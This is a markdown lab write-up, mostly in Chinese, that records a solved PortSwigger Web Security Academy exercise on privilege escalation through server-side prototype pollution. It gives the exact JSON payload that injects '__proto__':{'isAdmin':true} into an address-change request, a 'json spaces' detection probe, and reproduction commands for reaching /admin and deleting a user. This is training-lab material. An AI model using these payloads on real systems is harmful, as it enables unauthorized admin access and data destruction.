---
title: "lab-privilege-escalation-via-server-side-prototype-pollution"
links:
  - target: prototype-pollution-family
    relation: evidences
---

# lab-privilege-escalation-via-server-side-prototype-pollution

> evidences: [[prototype-pollution-family]]

- 题面:Privilege escalation via server-side prototype pollution
  (/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)
- 实例:https://0a03009404ae5afa81020230000600ab.web-security-academy.net(`wiener:peter`)
- 判定目标:污染 `isAdmin` 提权 → 进 `/admin` 删 carlos;状态:**solved**(solved_check true)

## 关键步

1. 登录用 **JSON 体**:`POST /login` `{"csrf":"…","username":"wiener","password":"peter"}`(表单编码会 500)。
2. 源:`POST /my-account/change-address`,JSON 体(字段 `address_line_1/2,city,postcode,country,sessionId`)。
   带 `"__proto__":{"isAdmin":true}` 后,**响应体里直接出现 `"isAdmin":true`**(合并把属性挂上了)。
3. 之后 `GET /admin` 即出用户列表 + `<a href="/admin/delete?username=carlos">Delete</a>` → 删 carlos → 翻。
4. 污染是**全局**的(`Object.prototype`):用 `"__proto__":{"json spaces":10}` 可作判据——之后的 JSON 响应会被缩进 ✓
   (本批实测:响应从紧凑变多行缩进)。清污染:`GET /node-app/restart`(lab banner 的 “Restart node application”)。

## 证据摘录

```
lab_http post "<inst>/my-account/change-address" --header 'Content-Type: application/json' \
  --body '{"address_line_1":"x","address_line_2":"y","city":"c","postcode":"p","country":"uk","sessionId":"<sid>","__proto__":{"isAdmin":true}}'
 -> 200 {"username":"wiener",…,"isAdmin":true}
lab_http get "<inst>/admin" -> 含 /admin/delete?username=carlos
lab_http get "<inst>/admin/delete?username=carlos" --follow -> 302 /admin
solved_check "<inst>/" --jar /tmp/b25-jar1.json -> {"solved":true}
```

## 复现命令

```
lab_launch launch 59D3F1AF71BD2E19B66AC67EFD8CAF8448B7B6A7A9C00CDD2881AEA324D1FE37 --widget-source /web-security/prototype-pollution/server-side --jar /tmp/b25-jar1.json
# GET /login 取 csrf → POST /login(JSON)→ GET /my-account 取 sessionId
# POST /my-account/change-address(JSON,__proto__.isAdmin=true)→ GET /admin → /admin/delete?username=carlos
```
